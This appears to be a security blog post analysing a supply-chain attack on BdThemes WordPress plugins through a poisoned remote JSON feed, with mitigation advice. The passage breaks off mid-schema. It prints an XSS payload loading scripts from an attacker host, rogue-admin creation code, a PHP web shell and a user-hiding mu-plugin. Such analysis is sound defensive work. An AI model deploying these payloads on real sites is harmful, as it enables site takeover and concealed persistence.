---
layout: post
title: 'Inside the BdThemes Supply Chain Attack: How Dynamic JSON Poisoning Compromised
  100,000+ WordPress Sites'
date: 2026-08-11 12:47:57 +0530
categories: Tech
excerpt: Over 100,000 WordPress sites were compromised overnight in a breach targeting
  BdThemes plugins. Discover how attackers used dynamic remote JSON stream poisoning
  to bypass security scanning and achieve site takeovers.
cover_image: /assets/images/posts/bdthemes-supply-chain-attack-json-poisoning-cover.png
cover_caption: Diagram illustrating dynamic JSON stream poisoning bypassing traditional
  static code security checks.
---

Software supply chain attacks have traditionally focused on compromise points early in the software development lifecycle: compromised developer credentials, malicious dependency updates in package registries, or tampered build pipelines. Security teams routinely monitor Git repositories, build artifacts, and upstream package managers for suspicious commits or version bumps.

However, the supply chain breach affecting BdThemes—a major ecosystem of WordPress plugins—demonstrated an entirely different, out-of-band attack surface. Over 100,000 active WordPress installations were compromised overnight without a single line of code changing in the official WordPress.org plugin repository, and without triggering standard update notifications or repository security alerts.

```
+-----------------------------------------------------------------------+
|                       Traditional Supply Chain                        |
|                                                                       |
|  [Dev Machine] ---> [Git Repo] ---> [Build/CI] ---> [Repository/Dist] |
|                                                                       |
|  * Detected by SAST, dependency scanners, and release versioning      |
+-----------------------------------------------------------------------+

+-----------------------------------------------------------------------+
|                    Dynamic Data Poisoning (BdThemes)                  |
|                                                                       |
|  [Plugin Source (Clean)]                                              |
|            |                                                          |
|            v                                                          |
|   [Client Browser] <--- Dynamic JSON (Poisoned) <--- [Cloud Storage]  |
|                                                                       |
|  * Completely bypasses static code analysis and version tracking      |
+-----------------------------------------------------------------------+
```

Rather than altering static plugin source code, threat actors gained unauthorized access to the vendor’s external cloud infrastructure and poisoned a dynamic remote JSON data stream. When authenticated site administrators logged into their control panels, their plugins fetched this dynamic remote payload. A client-side Cross-Site Scripting (XSS) vulnerability inside an internal library parsed the unescaped remote data directly into the Document Object Model (DOM), instantly executing arbitrary JavaScript within the context of a fully privileged administrative session.

Despite carrying a deceptively modest CVSS v3 score of 5.4 (Medium) due to its dependency on user context and external vector mechanics, the real-world operational impact was catastrophic: full site takeover, stealth persistence, and remote code execution (RCE) across tens of thousands of web servers. This incident represents a pivotal shift from static code injection to runtime dynamic data stream poisoning.

---

## Architecture of the Flaw: The Sigmative API and Biggopti Library

To understand how a dynamic JSON stream led to complete server compromise, we must first inspect the architecture of the internal component responsible for fetching dynamic assets: the **Biggopti** promotional library, which operates as part of the broader Sigmative API ecosystem within BdThemes plugins.

Like many commercial and freemium WordPress plugin developers, BdThemes integrated a dynamic promotional engine into their plugins. The Biggopti component was engineered to display dynamic dashboard notices, promotional banners, feature updates, and cross-plugin upsells directly inside the WordPress administrative interface (`wp-admin`). 

```
+------------------+         HTTP GET /config.json        +-----------------------+
|  Client Browser  | -----------------------------------> | DigitalOcean Spaces   |
| (Admin Session)  | <---------------------------------- | (Poisoned JSON File)  |
+------------------+     Unsanitized JSON Payload         +-----------------------+
         |
         | Parsing unescaped 'display_id'
         v
+------------------+
| DOM Execution    |
| (Stored XSS)     |
+------------------+
```

Instead of hardcoding banner content into static plugin releases, the Biggopti library performed outbound HTTP requests to fetch dynamic configuration files hosted remotely on a DigitalOcean Spaces object storage bucket. This allowed the vendor to update promotional campaigns in real time across their entire user base without pushing software updates through WordPress.org.

The architectural vulnerability existed in how the client-side JavaScript parsed and rendered the JSON response returned by the Sigmative API. Consider the conceptual logic used by the component when processing the fetched JSON configuration:

```javascript
// Vulnerable client-side response handling inside the Biggopti component
function renderAdminNotice(apiResponse) {
    // Parse the JSON data from the remote endpoint
    const noticeData = typeof apiResponse === 'string' ? JSON.parse(apiResponse) : apiResponse;

    if (noticeData && noticeData.status === 'success') {
        const noticeElement = document.createElement('div');
        
        // VULNERABILITY: 'display_id' is concatenated directly into the DOM as HTML 
        // without output sanitization or contextual escaping.
        noticeElement.className = 'notice notice-info biggopti-notice';
        noticeElement.setAttribute('data-id', noticeData.display_id);
        
        // Unsafe HTML string construction leading to DOM-based XSS
        noticeElement.innerHTML = `
            <div id="notice-${noticeData.display_id}">
                <h3>${noticeData.title}</h3>
                <p>${noticeData.content}</p>
            </div>
        `;

        document.querySelector('.wrap').prepend(noticeElement);
    }
}
```

The key vulnerability lay in the handling of the `display_id` parameter (alongside adjacent string attributes). The developer assumed that string fields returned by their own remote API endpoint were inherently trustworthy. Consequently, the value of `display_id` was passed directly into `innerHTML` contexts and HTML attribute string interpolations without escaping special HTML characters (such as `<`, `>`, `"`, or `'`).

If an attacker could control the contents of the remote JSON file, they could inject arbitrary HTML tags and `<script>` elements into `display_id`. Because this script executed inside `wp-admin` while an administrator was logged in, the injected code inherited the full administrative privileges of that user session.

---

## The Supply Chain Breach: Cloud Asset Hijacking and Payload Delivery

The attackers did not waste energy attempting to breach WordPress.org SVN credentials or crack individual WordPress site passwords. Instead, they targeted the vendor's cloud infrastructure hosting the remote JSON configurations.

Threat actors successfully gained write access to the vendor’s DigitalOcean Spaces bucket containing the dynamic JSON configuration files queried by the Sigmative API and Biggopti library. Once write access was established, the attackers modified the static `.json` endpoints stored on the cloud storage instance, replacing legitimate promotional metadata with a poisoned payload.

```json
{
  "status": "success",
  "display_id": "101\"><script src=\"https://attacker-controlled-domain.com/w2.js\"></script><script src=\"https://attacker-controlled-domain.com/x.js\"></script><div class=\"",
  "title": "System Update",
  "content": "Maintenance in progress."
}
```

When an administrator navigated anywhere within their WordPress dashboard where a BdThemes plugin rendered a Biggopti notice, the client browser executed the following sequence:

| Step | Component / Layer | Action | Security Context |
| :--- | :--- | :--- | :--- |
| **1. Request** | Client Browser (`wp-admin`) | Issues HTTP `GET` request to DigitalOcean Spaces for notice config. | Authenticated Administrator Session |
| **2. Response** | Cloud Storage (DigitalOcean) | Serves poisoned JSON configuration file containing malicious `display_id`. | External Unauthenticated Content |
| **3. Parsing** | Biggopti JS Library | Receives JSON; parses `display_id` directly into DOM via unsafe `innerHTML`. | Client-Side Execution Context |
| **4. Trigger** | Browser DOM Parser | Evaluates injected `<script>` tags embedded within `display_id`. | Same-Origin Administrative Context |
| **5. Execution** | External JS Engines (`w2.js`, `x.js`) | Loads and executes secondary multi-stage payloads. | Privileged REST API & Admin Access |

Because the script ran client-side within the administrator's browser, it bypassed all server-side Web Application Firewalls (WAFs) protecting incoming external HTTP requests to the WordPress host. To the victim’s web server, the subsequent malicious actions appeared as legitimate, authenticated HTTP requests originating from the administrator's IP address and browser session.

---

## Payload Analysis: Dissecting w2.js, x.js, and emer-run.php

Once the Stored XSS executed, it immediately initiated the second stage of the attack by calling two remote external JavaScript files hosted on attacker-controlled infrastructure: `w2.js` and `x.js`. These scripts worked in tandem to establish both automated server control and deterministic fallback credentials.

```
                       +-----------------------------+
                       |  Poisoned JSON (display_id) |
                       +-----------------------------+
                                      |
                                      v
                       +-----------------------------+
                       | Stored XSS in Admin Context |
                       +-----------------------------+
                                 /         \
                                /           \
                               v             v
                    +------------+         +------------+
                    |   w2.js    |         |    x.js    |
                    +------------+         +------------+
                          |                      |
          +---------------+---------------+      | Creates Deterministic
          |                               |      | Admin Credentials
          v                               v      v (bd_[hash] / Bd@26![hash]x)
+-------------------+           +-------------------+
| Creates Rogue     |           | Uploads Zip File  |
| Admin via REST    |           | with Web Shell    |
+-------------------+           +-------------------+
                                          |
                                          v
                                +-------------------+
                                |   emer-run.php    |
                                |  (PHP Web Shell)  |
                                +-------------------+
```

### Stage 2A: The Orchestration Payload (`w2.js`)

The primary execution payload, `w2.js`, performed three sequential actions designed to convert temporary administrative XSS into permanent Remote Code Execution (RCE) on the underlying web server:

1. **REST API Exploitation (User Creation):** `w2.js` queried the local WordPress REST API endpoints (`/wp-json/wp/v2/users`) using the active session's authentication nonce (`wp_rest`). It automatically dispatched a `POST` request to create a new administrative user account.
2. **Web Shell Staging via Plugin Upload:** Leveraging the administrator's privileges, `w2.js` issued a multipart form `POST` request to `/wp-admin/update.php?action=upload-plugin`. It programmatically uploaded a constructed `.zip` file containing a PHP web shell named `emer-run.php`.
3. **Persistence Mechanism Injection:** The script installed a Must-Use plugin (`mu-plugins`) script to enforce persistent backdoor access and conceal the newly created user accounts.

Below is an annotated architectural representation of the automated REST API user creation logic employed by `w2.js`:

```javascript
// Pseudocode representation of the w2.js REST API user creation routine
(function automatedAdminTakeover() {
    // Extract the internal WordPress REST API nonce from client environment
    const restNonce = window.wpApiSettings ? window.wpApiSettings.nonce : '';

    if (!restNonce) return;

    // Construct rogue administrative user object
    const rogueUserData = {
        username: "wp_sys_admin",
        name: "System Security Update",
        email: "sec-update@attacker-domain.com",
        roles: ["administrator"],
        password: "ComplexGeneratedPassword123!"
    };

    // Dispatch authenticated REST request to add new admin
    fetch('/wp-json/wp/v2/users', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-WP-Nonce': restNonce
        },
        body: JSON.stringify(rogueUserData)
    })
    .then(response => response.json())
    .then(data => {
        // Proceed to Stage 2B: Upload plugin archive containing emer-run.php
        uploadMaliciousPluginArchive(restNonce);
    });
})();
```

### Stage 2B: Deterministic Credential Derivation (`x.js`)

While `w2.js` attempted active API manipulation, the secondary script (`x.js`) executed a secondary, fallback credential generation algorithm.

In standard credential harvesting attacks, threat actors often create random usernames or send harvested passwords back to a Command and Control (C2) server. However, network-level monitoring or C2 infrastructure teardowns can sever this link. The author of `x.js` resolved this problem by employing a **deterministic credential generation algorithm** based on the target site's hostname.

```javascript
// Algorithmic representation of the x.js credential derivation logic
function deriveCredentials(hostname) {
    // Compute a cryptographic/hash representation of the host domain
    const hostHash = customHashAlgorithm(hostname.toLowerCase().trim());
    
    // Derive deterministic username and password strings
    const generatedUsername = `bd_${hostHash.substring(0, 8)}`;
    const generatedPassword = `Bd@26!${hostHash.substring(0, 10)}x`;

    return {
        username: generatedUsername,
        password: generatedPassword
    };
}
```

By computing credentials deterministically:
* The attacker did not need to maintain an active C2 connection to record generated passwords.
* The attacker could independently calculate the administrative credentials for *any* victim site at any point in the future simply by knowing the target domain name (e.g., `example.com` -> `bd_a1b2c3d4` / `Bd@26!a1b2c3d4e5x`).
* Scanning tools looking for outgoing exfiltration network traffic failed to flag credential transmission, because no network traffic was generated to transmit the password—it was derived entirely locally.

### Stage 3: Server Control via `emer-run.php`

The final component of the payload chain was `emer-run.php`, a PHP web shell written to disk via the automated plugin zip upload. Once uploaded, `emer-run.php` provided arbitrary command execution, system file traversal, database manipulation, and command-and-control capabilities directly on the hosting server environment.

```php
<?php
/**
 * Simplified conceptual representation of the emer-run.php web shell execution entrypoint
 */
if (isset($_REQUEST['cmd'])) {
    $param = $_REQUEST['cmd'];
    
    // Execution fallback pipeline
    if (function_exists('system')) {
        system($param);
    } elseif (function_exists('shell_exec')) {
        echo shell_exec($param);
    } elseif (function_exists('passthru')) {
        passthru($param);
    } elseif (function_exists('exec')) {
        exec($param, $output);
        echo implode("\n", $output);
    }
    exit;
}
?>
```

---

## Establishing Stealth and Persistence: Must-Use Plugins and DB Hooking

Gaining access is only half the battle for threat actors; maintaining access without detection is critical. The attackers implemented a sophisticated persistence and evasion layer by abusing native WordPress platform features: **Must-Use Plugins (`mu-plugins`)** and **Database Query Hooking**.

### The Strategic Value of Must-Use Plugins

In WordPress architecture, Must-Use plugins reside in the `wp-content/mu-plugins` directory. They differ from standard plugins in three critical ways:
1. They execute automatically on every page load without requiring explicit activation in the database.
2. They cannot be disabled through the standard WordPress administrative interface.
3. They are not listed in the main "Plugins" table in `wp-admin`; they are relegated to a separate, rarely inspected "Must-Use" tab.

The uploaded `w2.js` payload utilized its initial file system access to drop a custom PHP loader directly into `wp-content/mu-plugins/`.

```
/wp-content/
├── mu-plugins/
│   └── stealth-loader.php   <-- Automatically executed on EVERY HTTP request
├── plugins/
│   └── malformed-plugin/
│       └── emer-run.php     <-- Staged Web Shell
```

### Hiding Backdoors via Database Query Hooking

To ensure the newly created administrative user accounts (such as `bd_[hash]`) remained invisible to site owners inspecting the "Users" table in `wp-admin`, the persistence script implemented runtime database query hooking.

When a site administrator navigates to `/wp-admin/users.php`, WordPress constructs a `WP_User_Query` object, executing SQL queries via the global `$wpdb` object. The attacker's `mu-plugin` intercepted these database calls at execution time using standard WordPress filter hooks:

```php
<?php
/**
 * Conceptual implementation of database query filtering implemented by the persistence payload
 */
add_action('pre_user_query', function($user_query) {
    global $wpdb;

    // Verify execution context is within the administrative interface
    if (is_admin()) {
        // Intercept the WHERE clause of the user list SQL query
        // Exclude accounts matching the deterministic prefix 'bd_'
        $user_query->query_where = str_replace(
            "WHERE 1=1",
            "WHERE 1=1 AND {$wpdb->users}.user_login NOT LIKE 'bd_%'",
            $user_query->query_where
        );
    }
});
```

By dynamically modifying the `WHERE` clause of administrative queries, the persistent script ensured that:
* Rogue admin accounts were filtered out of the standard user management UI.
* The total user count displayed in the admin dashboard was dynamically decremented by the number of hidden accounts to prevent numerical discrepancies.
* Attackers retained active, functional administrative sessions using their algorithmically generated credentials.

This dynamic, runtime manipulation mirrors concepts seen in modern client-side and dynamic malware execution frameworks, such as the runtime assembly patterns documented in [Sourtrade Malware's Bun Runtime Assembly](/tech/2026/07/26/sourtrade-malware-bun-runtime-assembly.html). In both cases, attackers leverage flexible platform runtimes to build, modify, and conceal payloads in memory and at runtime rather than leaving static, easily detectable artifacts on disk.

---

## Mitigation and Hardening: Securing Remote Assets in Web Applications

The BdThemes attack highlights a dangerous systemic practice: treating remote dynamic APIs and configuration feeds as trusted internal boundaries. Securing modern applications against dynamic dynamic data poisoning requires a zero-trust approach to remote data ingestion.

```
                  +-----------------------------------+
                  |      Remote Data Source (JSON)    |
                  +-----------------------------------+
                                    |
                                    v
                  +-----------------------------------+
                  |      JSON Schema Validation       |
                  |  (Rejects illegal types/scripts)  |
                  +-----------------------------------+
                                    |
                                    v
                  +-----------------------------------+
                  |  Contextual Output Sanitization   |
                  |    (textContent / Escaping)       |
                  +-----------------------------------+
                                    |
                                    v
                  +-----------------------------------+
                  |  Content Security Policy (CSP)    |
                  |    (Blocks unauthorized execution)|
                  +-----------------------------------+
                                    |
                                    v
                  +-----------------------------------+
                  |           Safe DOM Render         |
                  +-----------------------------------+
```

### 1. Client-Side Escaping and Contextual Output Sanitization

Never assign untrusted remote string variables directly to sensitive DOM properties like `innerHTML`, `outerHTML`, or `document.write()`. Always enforce strict contextual escaping or use safe DOM node assignment APIs.

```javascript
// SECURE: Explicit DOM node construction and textual assignment
function renderAdminNoticeSecure(apiResponse) {
    const noticeData = typeof apiResponse === 'string' ? JSON.parse(apiResponse) : apiResponse;

    if (noticeData && noticeData.status === 'success') {
        const noticeElement = document.createElement('div');
        noticeElement.className = 'notice notice-info';

        // Set attributes safely using setAttribute or textContent
        // Prevent script evaluation even if noticeData.display_id contains raw HTML
        noticeElement.setAttribute('data-id', String(noticeData.display_id).replace(/[^a-zA-Z0-9_-]/g, ''));

        const titleElement = document.createElement('h3');
        titleElement.textContent = noticeData.title; // Automatically escapes HTML entities

        const messageElement = document.createElement('p');
        messageElement.textContent = noticeData.content; // Automatically escapes HTML entities

        noticeElement.appendChild(titleElement);
        noticeElement.appendChild(messageElement);

        document.querySelector('.wrap').appendChild(noticeElement);
    }
}
```

### 2. Strict Schema Validation for Remote Payloads

Before parsing dynamic configuration feeds, validate incoming JSON object structures against a strict, immutable JSON Schema. Reject responses containing unexpected data types, unverified attributes, or malformed string structures.

```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "title": "NoticeConfig",
  "type": "object",
  "properties": {
    "status": { "type": "string", "enum": ["success", "error"] },
    "display_id": { "type": "integer" },
    "title": { "type": "string", "maxLength": 100 },
    "content": { "type": "string", "maxLength": 50
